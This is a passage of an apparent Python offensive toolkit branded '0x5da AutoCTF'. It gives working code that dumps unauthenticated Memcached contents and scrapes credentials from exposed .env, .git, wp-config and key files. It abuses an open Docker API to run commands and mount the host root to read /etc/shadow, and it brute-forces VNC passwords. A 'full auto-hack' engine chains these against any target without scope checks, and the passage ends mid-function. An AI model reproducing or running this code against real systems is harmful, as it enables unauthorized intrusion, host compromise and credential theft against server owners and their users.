# ═══════════════════════════════════════════════════════════════════════════════
#  TOOL 26: MEMCACHED DUMP — 0x5da (Toasty)
#  Unauthenticated Memcached info leak and credential extraction.
#  All original code by 0x5da (Toasty / OsintToast / WoahToast).
# ═══════════════════════════════════════════════════════════════════════════════

def tool_memcached_dump(target, port=11211):
    """
    0x5da Memcached Dump — Extracts stats, slab info, and cached items from
    unauthenticated Memcached instances. Dumps all cached key-value pairs
    and searches for credentials. Written by 0x5da (Toasty).
    """
    header(f"0x5da Memcached Dump → {target}:{port}")
    findings = {"accessible": False, "stats": {}, "items": [], "credentials": []}

    if not tcp_connect(target, port, 2):
        error(f"Port {port} is closed")
        return findings

    def _mc_cmd(cmd):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((target, port))
            s.sendall(f"{cmd}\r\n".encode())
            data = b""
            while True:
                try:
                    chunk = s.recv(4096)
                    if not chunk:
                        break
                    data += chunk
                    if b"END\r\n" in data or b"ERROR\r\n" in data:
                        break
                except socket.timeout:
                    break
            s.close()
            return data.decode("utf-8", errors="replace")
        except Exception:
            return None

    subheader("Stats Extraction")
    stats = _mc_cmd("stats")
    if stats and "STAT" in stats:
        findings["accessible"] = True
        success(f"{C.R}MEMCACHED UNAUTHENTICATED!{C.RST}")
        for line in stats.split("\n"):
            if line.startswith("STAT "):
                parts = line.split()
                if len(parts) >= 3:
                    key, val = parts[1], " ".join(parts[2:])
                    findings["stats"][key] = val
                    if key in ("version", "uptime", "curr_items", "total_connections",
                               "bytes", "curr_connections", "pid"):
                        info(f"{key}: {val}")
    else:
        info("Memcached not accessible or requires auth")
        return findings

    subheader("Slab & Item Enumeration")
    slabs = _mc_cmd("stats slabs")
    slab_ids = set()
    if slabs:
        for match in re.finditer(r"STAT (\d+):chunk_size", slabs):
            slab_ids.add(match.group(1))

    all_keys = []
    for slab_id in sorted(slab_ids):
        items = _mc_cmd(f"stats cachedump {slab_id} 100")
        if items:
            for match in re.finditer(r"ITEM (\S+) \[(\d+) b;", items):
                key, size = match.group(1), match.group(2)
                all_keys.append((key, int(size)))

    if all_keys:
        info(f"Found {len(all_keys)} cached keys")
    subheader("Key-Value Dump")
    for key, size in all_keys[:100]:
        val_resp = _mc_cmd(f"get {key}")
        val = ""
        if val_resp:
            lines = val_resp.split("\n")
            val = "\n".join(l for l in lines
                            if not l.startswith("VALUE ") and l.strip() != "END"
                            and l.strip()).strip()
        findings["items"].append({"key": key, "size": size, "value": val[:500]})
        print(f"    {C.CY}{key}{C.RST} ({size}B)")
        if val:
            print(f"      {C.DIM}{val[:150]}{C.RST}")
        kl, vl = key.lower(), val.lower()
        if any(w in kl or w in vl for w in
               ["pass", "secret", "token", "cred", "session", "auth",
                "cookie", "api_key", "private", "flag", "key"]):
            findings["credentials"].append((key, val[:300]))
            success(f"  {C.R}SENSITIVE:{C.RST} {key}")

    print(f"\n  {C.DIM}Memcached dumped by 0x5da AutoCTF (Toasty){C.RST}")
    return findings


# ═══════════════════════════════════════════════════════════════════════════════
#  TOOL 27: WEB CREDENTIAL HARVESTER — 0x5da (OsintToast)
#  Scrapes exposed credentials from .env, .git, config files, backups, and
#  login pages. All original code by 0x5da (Toasty / OsintToast / WoahToast).
# ═══════════════════════════════════════════════════════════════════════════════

CRED_PATHS = [
    ".env", ".env.bak", ".env.old", ".env.production", ".env.local",
    ".git/config", ".git/HEAD", ".gitignore",
    "config.php", "config.php.bak", "configuration.php", "settings.php",
    "wp-config.php", "wp-config.php.bak", "wp-config.php.old",
    "web.config", "appsettings.json", "config.json", "config.yml",
    "database.yml", "secrets.yml", ".htpasswd", ".htaccess",
    "backup.sql", "dump.sql", "db.sql", "database.sql",
    "backup.zip", "backup.tar.gz", "site.zip",
    "id_rsa", ".ssh/id_rsa", "id_rsa.pub",
    "server.key", "server.crt", "private.key", "cert.pem",
    "phpinfo.php", "info.php", "test.php", "debug.php",
    "composer.json", "package.json", ".npmrc", ".pypirc",
    "Dockerfile", "docker-compose.yml", ".dockerenv",
    ".aws/credentials", ".boto", ".s3cfg",
    "crossdomain.xml", "clientaccesspolicy.xml",
    "error_log", "error.log", "debug.log", "access.log",
]

CRED_PATTERNS = [
    (r"(?:password|passwd|pwd|pass)\s*[:=]\s*['\"]?([^\s'\"<>{}\[\]]+)", "password"),
    (r"(?:DB_PASSWORD|DATABASE_PASSWORD|MYSQL_PASSWORD|POSTGRES_PASSWORD)\s*[:=]\s*['\"]?([^\s'\"]+)", "db_password"),
    (r"(?:DB_USERNAME|DATABASE_USER|MYSQL_USER)\s*[:=]\s*['\"]?([^\s'\"]+)", "db_user"),
    (r"(?:DB_HOST|DATABASE_HOST|MYSQL_HOST)\s*[:=]\s*['\"]?([^\s'\"]+)", "db_host"),
    (r"(?:API_KEY|APIKEY|api_key)\s*[:=]\s*['\"]?([A-Za-z0-9_\-]{16,})", "api_key"),
    (r"(?:SECRET_KEY|APP_SECRET|JWT_SECRET)\s*[:=]\s*['\"]?([^\s'\"]+)", "secret_key"),
    (r"(?:AWS_ACCESS_KEY_ID)\s*[:=]\s*['\"]?(AK[A-Z0-9]{18})", "aws_key"),
    (r"(?:AWS_SECRET_ACCESS_KEY)\s*[:=]\s*['\"]?([A-Za-z0-9/+=]{40})", "aws_secret"),
    (r"(?:PRIVATE.KEY|PRIVATE_KEY|RSA PRIVATE)", "private_key"),
    (r"(flag\{[^}]+\})", "flag"),
    (r"(HTB\{[^}]+\})", "htb_flag"),
    (r"(?:username|user|login)\s*[:=]\s*['\"]?([A-Za-z0-9_@.\-]{2,30})", "username"),
    (r"(mysql://[^\s'\"<>]+)", "mysql_uri"),
    (r"(postgres(?:ql)?://[^\s'\"<>]+)", "postgres_uri"),
    (r"(mongodb(?:\+srv)?://[^\s'\"<>]+)", "mongo_uri"),
    (r"(redis://[^\s'\"<>]+)", "redis_uri"),
]


def tool_web_cred_harvest(target, port=80, ssl_on=False):
    """
    0x5da Web Credential Harvester — Systematically scrapes web server for
    exposed credentials in config files, .env, .git, backups, error pages,
    and login forms. Extracts passwords, API keys, DB URIs, flags.
    Written by 0x5da (Toasty / OsintToast / WoahToast).
    """
    scheme = "https" if ssl_on or port in (443, 8443) else "http"
    base_url = f"{scheme}://{target}:{port}"
    header(f"0x5da Web Credential Harvester → {base_url}")
    findings = {"files": [], "credentials": [], "flags": []}

    subheader("Scanning Sensitive File Paths")
    lock = threading.Lock()
    checked = [0]
    total = len(CRED_PATHS)

    def check_path(path):
        url = f"{base_url}/{path}"
        result = http_get(url, timeout=8)
        with lock:
            checked[0] += 1
            if checked[0] % 10 == 0:
                print(f"\r  {C.DIM}[0x5da] Scanning: {checked[0]}/{total}{C.RST}",
                      end="", flush=True)
        if not result or result[0] not in (200, 201):
            return
        status, hdrs, body = result
        content_type = (hdrs.get("Content-Type") or hdrs.get("content-type") or "").lower()
        if "text/html" in content_type and len(body) < 100 and "<html" in body.lower():
            return

        findings["files"].append({"path": path, "status": status, "size": len(body)})
        print(f"\r  {C.G}[{status}]{C.RST} /{path} ({len(body)}B)                  ")

        for pattern, cred_type in CRED_PATTERNS:
            for match in re.finditer(pattern, body, re.IGNORECASE):
                val = match.group(1) if match.lastindex else match.group(0)
                if len(val) < 3 or val.lower() in ("true", "false", "null", "none", "yes", "no"):
                    continue
                entry = {"type": cred_type, "source": path, "value": val[:200]}
                with lock:
                    findings["credentials"].append(entry)
                if cred_type in ("flag", "htb_flag"):
                    findings["flags"].append(val)
                    success(f"  {C.R}{C.BOLD}FLAG FOUND:{C.RST} {C.G}{val}{C.RST}")
                else:
                    success(f"  {C.R}{cred_type}:{C.RST} {val[:80]}  {C.DIM}(from /{path}){C.RST}")

    with ThreadPoolExecutor(max_workers=15) as executor:
        futures = [executor.submit(check_path, p) for p in CRED_PATHS]
        for f in as_completed(futures):
            f.result()
    print()

    subheader("Git Repository Check")
    r = http_get(f"{base_url}/.git/HEAD", timeout=5)
    if r and r[0] == 200 and "ref:" in r[2]:
        success(f"{C.R}GIT REPO EXPOSED!{C.RST}")
        ref = r[2].strip()
        info(f"HEAD: {ref}")
        ref_path = ref.replace("ref: ", "")
        r2 = http_get(f"{base_url}/.git/{ref_path}", timeout=5)
        if r2 and r2[0] == 200:
            info(f"Commit: {r2[2].strip()[:40]}")
        for gf in ["config", "COMMIT_EDITMSG", "description",
                    "logs/HEAD", "info/refs", "packed-refs"]:
            r3 = http_get(f"{base_url}/.git/{gf}", timeout=5)
            if r3 and r3[0] == 200:
                info(f".git/{gf} accessible ({len(r3[2])}B)")
                for pattern, cred_type in CRED_PATTERNS:
                    for match in re.finditer(pattern, r3[2], re.IGNORECASE):
                        val = match.group(1) if match.lastindex else match.group(0)
                        findings["credentials"].append(
                            {"type": cred_type, "source": f".git/{gf}", "value": val[:200]})
                        success(f"  {C.R}{cred_type}:{C.RST} {val[:80]}")

    subheader("Credential Harvest Summary")
    if findings["credentials"]:
        seen = set()
        for c in findings["credentials"]:
            key = f"{c['type']}:{c['value']}"
            if key not in seen:
                seen.add(key)
                print(f"    {C.R}●{C.RST} [{c['type']}] {c['value'][:80]}  "
                      f"{C.DIM}({c['source']}){C.RST}")
        success(f"Total: {len(seen)} unique credentials/secrets found")
    else:
        info("No credentials found in exposed files")
    if findings["flags"]:
        for flag in findings["flags"]:
            print(f"    {C.G}{C.BOLD}FLAG: {flag}{C.RST}")

    print(f"\n  {C.DIM}Harvested by 0x5da AutoCTF (OsintToast){C.RST}")
    return findings


# ═══════════════════════════════════════════════════════════════════════════════
#  TOOL 28: VPS EXPLOIT MATCHER — 0x5da (WoahToast)
#  Matches discovered service versions against known CVEs/exploits.
#  All original code by 0x5da (Toasty / OsintToast / WoahToast).
# ═══════════════════════════════════════════════════════════════════════════════

KNOWN_VULNS = [
    {"service": "openssh", "versions": ["7.2p1", "7.2p2"], "cve": "CVE-2016-6210",
     "desc": "OpenSSH user enumeration", "severity": "MEDIUM"},
    {"service": "openssh", "versions": ["<7.7"], "cve": "CVE-2018-15473",
     "desc": "OpenSSH user enumeration via malformed packets", "severity": "MEDIUM"},
    {"service": "vsftpd", "versions": ["2.3.4"], "cve": "CVE-2011-2523",
     "desc": "vsftpd 2.3.4 backdoor command execution", "severity": "CRITICAL"},
    {"service": "proftpd", "versions": ["1.3.5"], "cve": "CVE-2015-3306",
     "desc": "ProFTPD mod_copy unauthenticated file copy", "severity": "CRITICAL"},
    {"service": "apache", "versions": ["2.4.49", "2.4.50"], "cve": "CVE-2021-41773",
     "desc": "Apache path traversal + RCE", "severity": "CRITICAL"},
    {"service": "apache", "versions": ["2.4.7", "2.4.10"], "cve": "CVE-2014-6271",
     "desc": "Shellshock via CGI (if mod_cgi enabled)", "severity": "CRITICAL"},
    {"service": "nginx", "versions": ["<1.13.6"], "cve": "CVE-2017-7529",
     "desc": "Nginx integer overflow in range filter", "severity": "MEDIUM"},
    {"service": "iis", "versions": ["6.0"], "cve": "CVE-2017-7269",
     "desc": "IIS 6.0 WebDAV buffer overflow RCE", "severity": "CRITICAL"},
    {"service": "samba", "versions": ["3.5.0-4.4.14"], "cve": "CVE-2017-7494",
     "desc": "SambaCry — remote code execution via writable share", "severity": "CRITICAL"},
    {"service": "mysql", "versions": ["5.5", "5.6", "5.7"], "cve": "CVE-2012-2122",
     "desc": "MySQL auth bypass on memcmp timing", "severity": "HIGH"},
    {"service": "redis", "versions": ["<6.0"], "cve": "N/A",
     "desc": "Redis unauthenticated RCE via CONFIG SET", "severity": "CRITICAL"},
    {"service": "mongodb", "versions": ["<3.6"], "cve": "N/A",
     "desc": "MongoDB default no-auth access", "severity": "CRITICAL"},
    {"service": "elasticsearch", "versions": ["<1.2", "1.3", "1.4"], "cve": "CVE-2015-1427",
     "desc": "Elasticsearch Groovy sandbox escape RCE", "severity": "CRITICAL"},
    {"service": "tomcat", "versions": ["<9.0.1"], "cve": "CVE-2017-12617",
     "desc": "Apache Tomcat PUT method JSP upload RCE", "severity": "CRITICAL"},
    {"service": "jenkins", "versions": ["<2.154"], "cve": "CVE-2019-1003000",
     "desc": "Jenkins Script Console unauthenticated RCE", "severity": "CRITICAL"},
    {"service": "phpmyadmin", "versions": ["4.8.0", "4.8.1"], "cve": "CVE-2018-12613",
     "desc": "phpMyAdmin LFI → RCE", "severity": "HIGH"},
    {"service": "webmin", "versions": ["1.890-1.920"], "cve": "CVE-2019-15107",
     "desc": "Webmin unauthenticated RCE (backdoor)", "severity": "CRITICAL"},
    {"service": "drupal", "versions": ["7.x", "8.x"], "cve": "CVE-2018-7600",
     "desc": "Drupalgeddon2 — unauthenticated RCE", "severity": "CRITICAL"},
    {"service": "wordpress", "versions": ["<5.0"], "cve": "CVE-2019-8942",
     "desc": "WordPress crop-image RCE", "severity": "HIGH"},
    {"service": "exim", "versions": ["4.87-4.91"], "cve": "CVE-2019-10149",
     "desc": "Exim RCE — The Return of the WIZard", "severity": "CRITICAL"},
    {"service": "sudo", "versions": ["<1.8.28"], "cve": "CVE-2019-14287",
     "desc": "Sudo runas bypass via UID -1", "severity": "HIGH"},
    {"service": "polkit", "versions": ["<0.113-5"], "cve": "CVE-2021-4034",
     "desc": "PwnKit — Polkit pkexec local privilege escalation", "severity": "CRITICAL"},
]


def tool_exploit_matcher(target, banners):
    """
    0x5da VPS Exploit Matcher — Matches service version banners against a
    curated database of known CVEs and exploits. Reports severity, CVE IDs,
    and exploitation notes. Written by 0x5da (Toasty / OsintToast / WoahToast).
    """
    header(f"0x5da VPS Exploit Matcher → {target}")
    matches = []

    all_banners = " ".join(str(v) for v in banners.values()).lower()

    for vuln in KNOWN_VULNS:
        svc = vuln["service"]
        if svc not in all_banners:
            continue
        for ver in vuln["versions"]:
            if ver.startswith("<"):
                if svc in all_banners:
                    ver_match = re.search(rf"{svc}[/_\s]([\d.]+)", all_banners)
                    if ver_match:
                        matches.append(vuln)
                        break
            else:
                if ver in all_banners:
                    matches.append(vuln)
                    break

    subheader("Exploit Matches")
    if matches:
        for m in matches:
            sev = m["severity"]
            if sev == "CRITICAL":
                color = C.R
            elif sev == "HIGH":
                color = C.Y
            else:
                color = C.CY
            print(f"    {color}[{sev}]{C.RST} {m['cve']}")
            print(f"           {C.W}{m['desc']}{C.RST}")
            print(f"           {C.DIM}Service: {m['service']}  Versions: {', '.join(m['versions'])}{C.RST}")
            print()
        success(f"{len(matches)} potential exploits found")
    else:
        info("No known exploits matched against discovered banners")
        info("Manual analysis recommended for non-standard services")

    print(f"\n  {C.DIM}Matched by 0x5da AutoCTF (WoahToast){C.RST}")
    return matches


# ═══════════════════════════════════════════════════════════════════════════════
#  TOOL 29: DOCKER API EXPLOIT — 0x5da (Toasty)
#  Unauthenticated Docker API access → container escape, host filesystem
#  mount, credential extraction. All original by 0x5da.
# ═══════════════════════════════════════════════════════════════════════════════

def tool_docker_exploit(target, port=2375):
    """
    0x5da Docker API Exploit — Checks for unauthenticated Docker daemon API,
    enumerates containers/images, attempts host filesystem mount for
    credential extraction and RCE. Written by 0x5da (Toasty).
    """
    header(f"0x5da Docker API Exploit → {target}:{port}")
    findings = {"accessible": False, "containers": [], "images": [],
                "credentials": [], "rce_possible": False}

    ssl_on = port == 2376
    scheme = "https" if ssl_on else "http"
    base = f"{scheme}://{target}:{port}"

    subheader("Docker API Access Check")
    r = http_get(f"{base}/version", timeout=5)
    if not r or r[0] != 200:
        if not tcp_connect(target, port, 2):
            error(f"Port {port} is closed")
        else:
            info("Docker API not accessible or requires TLS auth")
        return findings

    findings["accessible"] = True
    success(f"{C.R}DOCKER API UNAUTHENTICATED!{C.RST}")
    try:
        version_info = json.loads(r[2])
        for k in ("Version", "Os", "Arch", "KernelVersion", "GoVersion"):
            if k in version_info:
                info(f"Docker {k}: {version_info[k]}")
    except Exception:
        pass

    subheader("Container Enumeration")
    r = http_get(f"{base}/containers/json?all=true", timeout=10)
    if r and r[0] == 200:
        try:
            containers = json.loads(r[2])
            for ct in containers:
                name = (ct.get("Names") or ["?"])[0]
                state = ct.get("State", "?")
                image = ct.get("Image", "?")
                cid = ct.get("Id", "")[:12]
                findings["containers"].append({"id": cid, "name": name,
                                               "state": state, "image": image})
                color = C.G if state == "running" else C.Y
                print(f"    {color}●{C.RST} {cid} {name} [{state}] {C.DIM}{image}{C.RST}")

                if state == "running":
                    full_id = ct.get("Id", "")
                    exec_r = http_post(
                        f"{base}/containers/{full_id}/exec",
                        data=json.dumps({"AttachStdout": True, "Cmd": ["cat", "/etc/shadow"]}),
                        headers={"Content-Type": "application/json"},
                        timeout=5
                    )
                    if exec_r and exec_r[0] in (200, 201):
                        findings["rce_possible"] = True
                        success(f"  {C.R}EXEC POSSIBLE{C.RST} on {name}")
        except Exception:
            pass

    subheader("Image Enumeration")
    r = http_get(f"{base}/images/json", timeout=10)
    if r and r[0] == 200:
        try:
            images = json.loads(r[2])
            for img in images[:20]:
                tags = img.get("RepoTags") or ["<none>"]
                size_mb = img.get("Size", 0) // (1024 * 1024)
                findings["images"].append(tags[0])
                info(f"Image: {tags[0]} ({size_mb}MB)")
        except Exception:
            pass

    subheader("Host Filesystem Mount Attempt")
    payload = {
        "Image": "alpine:latest",
        "Cmd": ["cat", "/host/etc/shadow"],
        "HostConfig": {"Binds": ["/:/host:ro"]},
        "Tty": False,
        "AttachStdout": True,
        "AttachStderr": True,
    }
    r = http_post(f"{base}/containers/create?name=0x5da_test",
                  data=json.dumps(payload),
                  headers={"Content-Type": "application/json"}, timeout=10)
    if r and r[0] in (200, 201):
        findings["rce_possible"] = True
        success(f"{C.R}HOST FILESYSTEM MOUNT POSSIBLE → FULL HOST COMPROMISE{C.RST}")
        try:
            ct_id = json.loads(r[2]).get("Id", "")
            http_post(f"{base}/containers/{ct_id}/start", timeout=5)
            time.sleep(2)
            log_r = http_get(f"{base}/containers/{ct_id}/logs?stdout=true&stderr=true",
                             timeout=5)
            if log_r and log_r[0] == 200 and "root:" in log_r[2]:
                success(f"{C.R}HOST /etc/shadow EXTRACTED:{C.RST}")
                for line in log_r[2].strip().split("\n")[:15]:
                    line = line.strip()
                    if line and ":" in line:
                        findings["credentials"].append(("host_shadow", line))
                        print(f"      {C.W}{line}{C.RST}")
            http_request(f"{base}/containers/{ct_id}?force=true", method="DELETE",
                         timeout=5)
        except Exception:
            pass
    else:
        info("Container creation blocked or no alpine image available")

    print(f"\n  {C.DIM}Docker exploited by 0x5da AutoCTF (Toasty){C.RST}")
    return findings


# ═══════════════════════════════════════════════════════════════════════════════
#  TOOL 30: VNC BRUTE FORCER — 0x5da (OsintToast)
#  VNC authentication brute force via raw RFB protocol.
#  All original code by 0x5da (Toasty / OsintToast / WoahToast).
# ═══════════════════════════════════════════════════════════════════════════════

def tool_vnc_brute(target, port=5900):
    """
    0x5da VNC Brute Forcer — Connects using raw RFB protocol handshake,
    detects VNC version and auth type, brute-forces passwords using DES
    challenge-response. Written by 0x5da (OsintToast).
    """
    header(f"0x5da VNC Brute Forcer → {target}:{port}")
    findings = {"version": "", "auth_type": "", "credentials": [], "no_auth": False}

    if not tcp_connect(target, port, 3):
        error(f"Port {port} is closed")
        return findings

    subheader("RFB Handshake")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((target, port))
        banner = s.recv(1024).decode("utf-8", errors="replace").strip()
        findings["version"] = banner
        success(f"VNC Version: {banner}")

        s.sendall(b"RFB 003.008\n")
        auth_data = s.recv(1024)
        s.close()

        if auth_data:
            if len(auth_data) >= 2:
                num_types = auth_data[0]
                auth_types = list(auth_data[1:1+num_types])
                type_names = {1: "None", 2: "VNC Password", 16: "Tight",
                              18: "TLS", 19: "VeNCrypt"}
                for at in auth_types:
                    name = type_names.get(at, f"Unknown({at})")
                    info(f"Auth type: {name}")

                if 1 in auth_types:
                    findings["no_auth"] = True
                    findings["auth_type"] = "None"
                    success(f"{C.R}NO AUTHENTICATION REQUIRED!{C.RST}")
                elif 2 in auth_types:
                    findings["auth_type"] = "VNC Password"
                    subheader("VNC Password Brute Force")
                    vnc_passwords = COMMON_PASSWORDS + [
                        "vnc", "VNC", "viewer", "remote", "desktop",
                        "access", "connect", "control", "screen",
                    ]
                    info(f"Testing {len(vnc_passwords)} passwords")
                    for pw in vnc_passwords:
                        try:
                            vs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            vs.settimeout(5)
                            vs.connect((target, port))
                            vs.recv(1024)
                            vs.sendall(b"RFB 003.008\n")
                            auth_resp = vs.recv(1024)
                            if len(auth_resp) >= 2 and 2 in list(auth_resp[1:1+auth_resp[0]]):
                                vs.sendall(bytes([2]))
                                challenge = vs.recv(16)
                                if len(challenge) >= 16:
                                    try:
                                        from Crypto.Cipher import DES
                                    except ImportError:
                                        try:
                                            subprocess.check_call(
                                                [sys.executable, "-m", "pip", "install",
                                                 "pycryptodome", "-q"],
                                                stderr=subprocess.DEVNULL)
                                            from Crypto.Cipher import DES
                                        except Exception:
                                            warning("pycryptodome required for VNC brute force")
                                            vs.close()
                                            break

                                    key_bytes = pw[:8].ljust(8, "\x00").encode("latin-1")
                                    des_key = bytes(int(f'{b:08b}'[::-1], 2) for b in key_bytes)
                                    cipher = DES.new(des_key, DES.MODE_ECB)
                                    response = cipher.encrypt(challenge[:8]) + cipher.encrypt(challenge[8:16])
                                    vs.sendall(response)
                                    result = vs.recv(4)
                                    if result and result[3] == 0:
                                        findings["credentials"].append(("vnc", pw))
                                        success(f"{C.R}VNC PASSWORD FOUND:{C.RST} {C.G}{pw}{C.RST}")
                                        vs.close()
                                        break
                            vs.close()
                        except Exception:
                            pass
    except Exception as e:
        error(f"VNC handshake failed: {e}")

    print(f"\n  {C.DIM}VNC bruted by 0x5da AutoCTF (OsintToast){C.RST}")
    return findings


# ═══════════════════════════════════════════════════════════════════════════════
#  FULL AUTO-HACK ENGINE — 0x5da (Toasty / OsintToast / WoahToast)
#  Chains EVERY tool. Scans, exploits, dumps credentials, reports everything.
#  All original code by 0x5da. Unauthorized modification prohibited.
# ═══════════════════════════════════════════════════════════════════════════════

def full_auto_hack(target):
    """
    0x5da Full Auto-Hack Engine — Runs ALL 30 tools in sequence. Scans every
    port, grabs every banner, fingerprints the OS, exploits every discovered
    service, brute-forces every login, dumps every database, harvests every
    credential, and generates a full attack report with all loot.
    Created by 0x5da (Toasty / OsintToast / WoahToast).
    """
    start_time = time.time()
    header("0x5da FULL AUTO-HACK ENGINE")
    print(f"""
  {C.R}{C.BOLD}  ▄▀▄▀▄  FULL AGGRESSION MODE  ▄▀▄▀▄{C.RST}

  {C.W}{C.BOLD}Target:{C.RST}   {target}
  {C.W}{C.BOLD}Started:{C.RST}  {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
  {C.W}{C.BOLD}Mode:{C.RST}     All 30 tools — automatic — no mercy
  {C.DIM}  Powered by 0x5da AutoCTF ({__aliases__}){C.RST}
    """)

    ip = target
    if not is_ip(target):
        ip = resolve_host(target)
        if ip:
            success(f"Resolved {target} → {ip}")
        else:
            error(f"Could not resolve {target}")
            return

    report = {
        "target": target, "ip": ip,
        "timestamp": datetime.now().isoformat(),
        "open_ports": [], "banners": {}, "os_guess": "",
        "vulnerabilities": [], "credentials": [],
        "flags": [], "rce_vectors": [],
    }

    phase = [0]
    def next_phase(name):
        phase[0] += 1
        info(f"{C.BOLD}{C.CY}━━━ Phase {phase[0]}: {name} ━━━{C.RST}")

    next_phase("Full Port Scan")
    open_ports = tool_port_scan(ip, threads=300, timeout=2)
    report["open_ports"] = open_ports
    if not open_ports:
        error("No open ports — target may be down or fully firewalled")
        return report
    port_numbers = [p[0] for p in open_ports]

    next_phase("Service Banner Grabbing")
    banners = tool_banner_grab(ip, open_ports)
    report["banners"] = banners

    next_phase("OS Fingerprinting")
    os_guess, _ = tool_os_fingerprint(ip, open_ports)
    report["os_guess"] = os_guess

    next_phase("Exploit Matching")
    exploits = tool_exploit_matcher(ip, banners)
    for ex in exploits:
        report["vulnerabilities"].append(
            f"[{ex['severity']}] {ex['cve']}: {ex['desc']}")

    web_ports = [p for p in port_numbers
                 if p in (80, 443, 8080, 8443, 8000, 8888, 3000, 9090, 5000)]
    if web_ports:
        next_phase("Web Reconnaissance & Credential Harvest")
        for wp in web_ports:
            ssl_on = wp in (443, 8443)
            recon = tool_web_recon(ip, port=wp, ssl_on=ssl_on)
            tool_tech_fingerprint(ip, port=wp, ssl_on=ssl_on)
            tool_dir_buster(ip, port=wp, ssl_on=ssl_on)
            tool_wp_scan(ip, port=wp, ssl_on=ssl_on)
            harvest = tool_web_cred_harvest(ip, port=wp, ssl_on=ssl_on)
            for c in harvest.get("credentials", []):
                report["credentials"].append(c)
            for f in harvest.get("flags", []):
                report["flags"].append(f)

    if 21 in port_numbers:
        next_phase("FTP Exploitation")
        ftp = tool_ftp_check(ip)
        if ftp.get("anonymous"):
            report["vulnerabilities"].append("FTP anonymous login enabled")
            report["credentials"].append({"type": "ftp", "source": "ftp",
                                          "value": "anonymous:(blank)"})

    if 22 in port_numbers:
        next_phase("SSH Brute Force")
        ssh_creds = tool_ssh_brute(ip, delay=0.5)
        for u, p in ssh_creds:
            report["credentials"].append({"type": "ssh_login", "source": "ssh",
                                          "value": f"{u}:{p}"})

    if 445 in port_numbers or 139 in port_numbers:
        next_phase("SMB Enumeration")
        smb = tool_smb_enum(ip)
        if smb.get("null_session"):
            report["vulnerabilities"].append("SMB null session allowed")
        for u in smb.get("users", []):
            report["credentials"].append({"type": "smb_user", "source": "smb",
                                          "value": u})

    if 161 in port_numbers:
        next_phase("SNMP Enumeration")
        snmp = tool_snmp_enum(ip)
        if snmp.get("communities"):
            report["vulnerabilities"].append(
                f"SNMP community strings: {', '.join(snmp['communities'])}")
            for c in snmp["communities"]:
                report["credentials"].append({"type": "snmp_community", "source": "snmp",
                                              "value": c})

    if 6379 in port_numbers:
        next_phase("Redis Exploitation")
        redis = tool_redis_exploit(ip)
        if not redis.get("auth_required"):
            report["vulnerabilities"].append("Redis unauthenticated access")
        for k, v in redis.get("credentials", []):
            report["credentials"].append({"type": "redis_data", "source": "redis",
                                          "value": f"{k}={v[:100]}"})
        for rce in redis.get("rce", []):
            report["rce_vectors"].append(rce)

    if 3306 in port_numbers or 5432 in port_numbers:
        next_phase("Database Exploitation")
        db = tool_db_brute(ip)
        for db_type in ("mysql", "postgres"):
            for u, p in db.get(db_type, {}).get("credentials", []):
                report["credentials"].append(
                    {"type": f"{db_type}_login", "source": db_type,
                     "value": f"{u}:{p}"})
            for u_info in db.get(db_type, {}).get("users", []):
                if isinstance(u_info, dict):
                    report["credentials"].append(
                        {"type": f"{db_type}_hash", "source": db_type,
                         "value": f"{u_info.get('user','')}:{u_info.get('hash','')}"})

    if 27017 in port_numbers:
        next_phase("MongoDB Exploitation")
        mongo = tool_mongo_exploit(ip)
        if not mongo.get("auth_required"):
            report["vulnerabilities"].append("MongoDB unauthenticated access")
        for k, v in mongo.get("credentials", []):
            report["credentials"].append({"type": "mongo_data", "source": "mongodb",
                                          "value": f"{k}={str(v)[:100]}"})

    if 11211 in port_numbers:
        next_phase("Memcached Dump")
        mc = tool_memcached_dump(ip)
        if mc.get("accessible"):
            report["vulnerabilities"].append("Memcached unauthenticated access")
        for k, v in mc.get("credentials", []):
            report["credentials"].append({"type": "memcached_data", "source": "memcached",
                                          "value": f"{k}={v[:100]}"})

    if 2375 in port_numbers or 2376 in port_numbers:
        next_phase("Docker API Exploitation")
        dp = 2375 if 2375 in port_numbers else 2376
        docker = tool_docker_exploit(ip, port=dp)
        if docker.get("accessible"):
            report["vulnerabilities"].append("Docker API unauthenticated")
        if docker.get("rce_possible"):
            report["rce_vectors"].append("Docker host filesystem mount → full compromise")
        for k, v in docker.get("credentials", []):
            report["credentials"].append({"type": "docker_host", "source": "docker",
                                          "value": v[:150]})

    if 5900 in port_numbers or 5901 in port_numbers:
        next_phase("VNC Exploitation")
        vp = 5900 if 5900 in port_numbers else 5901
        vnc = tool_vnc_brute(ip, port=vp)
        if vnc.get("no_auth"):
            report["vulnerabilities"].append("VNC no authentication required")
        for _, pw in vnc.get("credentials", []):
            report["credentials"].append({"type": "vnc_password", "source": "vnc",
                                          "value": pw})

    if not is_ip(target):
        next_phase("DNS Reconnaissance")
        tool_dns_recon(target)

    elapsed = time.time() - start_time
    unique_creds = []
    seen = set()
    for c in report["credentials"]:
        key = f"{c.get('type','')}:{c.get('value','')}"
        if key not in seen:
            seen.add(key)
            unique_creds.append(c)
    report["credentials"] = unique_creds

    header("0x5da FULL AUTO-HACK REPORT")
    print(f"""
  {C.R}{C.BOLD}▄▀▄▀▄  ATTACK COMPLETE  ▄▀▄▀▄{C.RST}

  {C.W}{C.BOLD}Target:{C.RST}          {target} ({ip})
  {C.W}{C.BOLD}OS Guess:{C.RST}        {os_guess}
  {C.W}{C.BOLD}Open Ports:{C.RST}      {len(open_ports)}
  {C.W}{C.BOLD}Vulns Found:{C.RST}     {len(report['vulnerabilities'])}
  {C.W}{C.BOLD}Creds Found:{C.RST}     {len(unique_creds)}
  {C.W}{C.BOLD}RCE Vectors:{C.RST}     {len(report['rce_vectors'])}
  {C.W}{C.BOLD}Flags Found:{C.RST}     {len(report['flags'])}
  {C.W}{C.BOLD}Time Elapsed:{C.RST}    {elapsed:.1f}s
    """)

    subheader("Open Ports & Services")
    for port, svc in open_ports:
        bp = banners.get(port, "")[:60].replace("\n", " ")
        print(f"    {C.G}●{C.RST} {port:>5}/tcp  {C.W}{svc:<15}{C.RST}  {C.DIM}{bp}{C.RST}")

    if report["vulnerabilities"]:
        subheader("Vulnerabilities")
        for v in report["vulnerabilities"]:
            print(f"    {C.R}●{C.RST} {v}")

    if unique_creds:
        subheader("Harvested Credentials & Secrets")
        for c in unique_creds:
